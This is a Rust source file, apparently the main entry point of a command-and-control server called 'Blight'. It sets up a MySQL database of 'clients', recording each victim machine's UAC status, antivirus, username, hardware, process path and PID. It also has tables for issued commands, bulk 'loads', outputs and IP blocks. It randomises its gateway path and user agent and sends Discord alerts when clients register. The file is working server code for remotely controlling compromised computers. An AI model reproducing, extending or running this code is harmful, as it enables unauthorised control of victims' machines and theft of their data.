mod libraries;
mod web_paths;

use crate::web_paths::{
    api::{
        blocks::*,
        clients::*,
        loads::*,
        outputs::*
    },
    gateway::*
};

extern crate colored; 
use actix_web::{
    web, App, HttpServer
};
use random_string::generate;

use crate::libraries::miscellaneous::general::*;

use std::{
    fs, str, fs::File,
    io::Write, process::exit,
    path::Path, 
    sync::{Arc, RwLock},
};

use mysql_async::{*, prelude::*};

use lazy_static::lazy_static;
use crate::serde_json::json;
use serde_json;
use sha256;
use std::process::Command;

lazy_static! {
    static ref CONNECTION_INTERVAL: Arc<RwLock<u64>> = Arc::new(RwLock::new(0));
    static ref CONNECTION_INTERVAL_BUFFER: Arc<RwLock<u64>> = Arc::new(RwLock::new(0));
    static ref PURGATORY_INTERVAL: Arc<RwLock<u64>> = Arc::new(RwLock::new(0));
    static ref ENABLE_FIREWALL: Arc<RwLock<bool>> = Arc::new(RwLock::new(false));
    static ref API_SECRET: Arc<RwLock<String>> = Arc::new(RwLock::new(String::from("root")));
    static ref CONNECTION_POOL: Arc<RwLock<Pool>> = Arc::new(RwLock::new(Pool::from_url("mysql://unknown:unknown@1.1.1.1:1000/database").unwrap()));
    static ref IP_DATABASE: Arc<RwLock<Vec<u8>>> = Arc::new(RwLock::new(vec![u8::from(0)]));
    static ref INITIAL_ENCRYPTION_KEY: Arc<RwLock<String>> = Arc::new(RwLock::new(String::new()));
    static ref HOST: Arc<RwLock<String>> = Arc::new(RwLock::new(String::new()));
    static ref SUSPICIOUS_IP_CHECK: Arc<RwLock<bool>> = Arc::new(RwLock::new(false));
    static ref MAX_OUTPUT_SUBMISSION_KB: Arc<RwLock<u64>> = Arc::new(RwLock::new(0));

    static ref GATEWAY_PATH: Arc<RwLock<String>> = Arc::new(RwLock::new(String::new()));
    static ref USERAGENT: Arc<RwLock<String>> = Arc::new(RwLock::new(String::new()));
}

lazy_static! {
    static ref DISCORD_WEBHOOK_URL: Arc<RwLock<String>> = Arc::new(RwLock::new(String::new()));
    static ref NOTIFICATION_ON_CLIENT_REGISTRATION: Arc<RwLock<bool>> = Arc::new(RwLock::new(false));
    static ref NOTIFICATION_ON_CLIENT_RECONNECTION: Arc<RwLock<bool>> = Arc::new(RwLock::new(false));
    static ref NOTIFICATION_ON_COMMAND_COMPLETION: Arc<RwLock<bool>> = Arc::new(RwLock::new(false));
}

const CHARSET: &str = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";

// Generate a random gateway path on first execution. After that, read it from json config 

#[actix_web::main]
async fn main() -> std::io::Result<()> {
    #[cfg(target_os = "windows")]
    colored::control::set_virtual_terminal(true).unwrap();

    #[cfg(target_os = "linux")]
    Command::new("ulimit").arg("-n").arg("524288");

    println!("
    _                 
    /_  //  .  __   /_  -/-
  _/_)_(/__/__(_/__/ (__/_ 
              _/_          
             (/            
                           
    ");

    let json_config = fs::read("artifacts/configuration/server_config.json");

    fs::create_dir_all("artifacts/storages").unwrap();
    fs::create_dir_all("artifacts/configuration").unwrap();
    fs::create_dir_all("artifacts/databases").unwrap();

    match json_config {
        Ok(_) => (),
        Err(_) => {
            write!(File::create("artifacts/configuration/server_config.json").unwrap(), "{}", serde_json::to_string_pretty(
                &json!({
                    "api_secret": generate(64, CHARSET),
                    "inital_encryption_key": generate(32, CHARSET),
                    "gateway_path": generate(16, CHARSET),
                    "useragent": generate(16, CHARSET),

                    "connection_interval": 300,
                    "connection_interval_buffer": 10,
                    "purgatory_interval": 90,

                    "max_output_submission_kb": 10000,

                    "enable_firewall": true,
                    "suspicious_ip_check": false,

                    "mysql_server": "mysql://root:root@127.0.0.1:3306/database",
                    "host": "0.0.0.0:80",
                    
                    "webhook": {
                      "url": "",
                      "client_registered": false,
                      "client_reconnected": false,
                      "command_completed": false
                    }
                  })
            ).unwrap()).expect("Unable to write json file.");

            fprint("info", "Your \"artifacts/configuration/server_config.json\" file wasn't present. No worries, we've created it for you. ");
            fprint("info", "Open it in a text editor, and fill out the fields. Then, re-run Blight.");
            exit(1);
        }
    };

    let parsed_json_config: serde_json::Value = serde_json::from_str(str::from_utf8(&json_config.unwrap()).unwrap()).expect("erm");

    fprint("task", "We're setting up your server. This might take a few, hang tight.");
    let connection_pool: Pool = Pool::new(Opts::from_url(&key_to_string(&parsed_json_config, "mysql_server")).unwrap());
    let mut connection = connection_pool.get_conn().await.unwrap();
    let geolite_db = fs::read("artifacts/databases/GeoLite2-Country.mmdb");

    match geolite_db {
        Ok(_) => (),
        Err(_) => {
            fprint("error", "You don't have \"GeoLite2-Country.mmdb\" dowloaded. Find it and place it in \"artifacts/databases\"");
            exit(1);
        }
    };

    *CONNECTION_POOL.write().unwrap() = connection_pool.clone();
    *CONNECTION_INTERVAL.write().unwrap() = key_to_u64(&parsed_json_config, "connection_interval");
    *PURGATORY_INTERVAL.write().unwrap() = key_to_u64(&parsed_json_config, "purgatory_interval");
    *ENABLE_FIREWALL.write().unwrap() = key_to_bool(&parsed_json_config, "enable_firewall");
    *API_SECRET.write().unwrap() = key_to_string(&parsed_json_config, "api_secret");
    *INITIAL_ENCRYPTION_KEY.write().unwrap() = key_to_string(&parsed_json_config, "initial_encryption_key");
    *IP_DATABASE.write().unwrap() = geolite_db.unwrap();
    *HOST.write().unwrap() = key_to_string(&parsed_json_config, "host");
    *CONNECTION_INTERVAL_BUFFER.write().unwrap() = key_to_u64(&parsed_json_config, "connection_interval_buffer");
    *SUSPICIOUS_IP_CHECK.write().unwrap() = key_to_bool(&parsed_json_config, "suspicious_ip_check");
    *MAX_OUTPUT_SUBMISSION_KB.write().unwrap() = key_to_u64(&parsed_json_config, "max_output_submission_kb");

    *GATEWAY_PATH.write().unwrap() = key_to_string(&parsed_json_config, "gateway_path");
    *USERAGENT.write().unwrap() = key_to_string(&parsed_json_config, "useragent");

    *DISCORD_WEBHOOK_URL.write().unwrap() = key_to_string(&parsed_json_config["webhook"], "url");
    *NOTIFICATION_ON_CLIENT_REGISTRATION.write().unwrap() = key_to_bool(&parsed_json_config["webhook"], "client_registered");
    *NOTIFICATION_ON_CLIENT_RECONNECTION.write().unwrap() = key_to_bool(&parsed_json_config["webhook"], "client_reconnected");
    *NOTIFICATION_ON_COMMAND_COMPLETION.write().unwrap() = key_to_bool(&parsed_json_config["webhook"], "command_completed");

    connection.query_drop(
        r"
        CREATE TABLE IF NOT EXISTS clients (
            client_id TEXT,
            version INTEGER,
            uac BOOL,
            ip TEXT,
            country TEXT,
            username TEXT,
            guid TEXT,
            cpu TEXT,
            gpu TEXT,
            ram INTEGER,
            antivirus TEXT,
            path TEXT,
            pid INTEGER,
            last_seen INTEGER,
            first_seen INTEGER,
            encryption_key TEXT,
            key_expiration INT,
            build_id TEXT
        )  ENGINE=InnoDB;
        ").await.expect("clients table creation failed");

    
    connection.query_drop(
        r"
        CREATE TABLE IF NOT EXISTS purgatory (
            request_ip TEXT,
            encryption_key TEXT,
            expiration_time INT
        )  ENGINE=InnoDB;
        ").await.expect("purgatory table creation failed");
    
    connection.query_drop(
        r"
        CREATE TABLE IF NOT EXISTS commands (
            command_id TEXT,
            load_id TEXT,
            client_id TEXT,
            cmd_type TEXT,
            cmd_args TEXT,
            time_issued INT
        ) ENGINE=InnoDB;

    ").await.expect("commands table creation failed");
    
    connection.query_drop(
        r"
        CREATE TABLE IF NOT EXISTS outputs (
            output_id TEXT,
            command_id TEXT,
            load_id TEXT,
            client_id TEXT,
            cmd_args TEXT,
            cmd_type TEXT,
            output TEXT,
            time_issued INT,
            time_received INT
        ) ENGINE=InnoDB;

        ").await.expect("outputs table creation failed");
    
    connection.query_drop(
        r"
        CREATE TABLE IF NOT EXISTS loads (
            load_id TEXT,
            required_amount INT,
            completed_amount INT,
            is_recursive BOOL,
            cmd_args TEXT,
            cmd_type TEXT,
            note TEXT,
            time_issued INT
        ) ENGINE=InnoDB;
    ").await.expect("loads table creation failed");
    
    connection.query_drop(
        r"
        CREATE TABLE IF NOT EXISTS blocks (
            block_id TEXT,
            client_id TEXT,
            reason TEXT,
            ip TEXT,
            banned_until INT
        ) ENGINE=InnoDB;

    ").await.expect("blocks table creation failed");

    fprint("info", &format!(
        "Server running! Gateway path: http://{}/{}", 
            key_to_string(&parsed_json_config, "host"), 
            key_to_string(&parsed_json_config, "gateway_path")
        )
    );

    discord_webhook_push(
        "💻 Server Online",
        "Your API server is up and running, and your Discord webhook is configured to recieve notifications.",
        0x00ff7f,
        false
    ).await;
    
    HttpServer::new(move || {
        App::new()
            .app_data(web::PayloadConfig::default().limit((*MAX_OUTPUT_SUBMISSION_KB.read().unwrap()) as usize * 1024)) 
            .service(api_issue_load)
            .service(api_clients_list)
            .service(api_get_output)
            .service(loads_list)
            .service(remove_load)
            .service(statistics)
            .service(api_blocks_list)
            .service(api_remove_block)
            .service(gateway_get_block)
            .service(api_outputs_list)
            .service(api_parse_storage)
            .service(api_issue_command)
            .service(gateway)
    })
    .bind(&key_to_string(&parsed_json_config, "host"))? 
    .run()
    .await
}
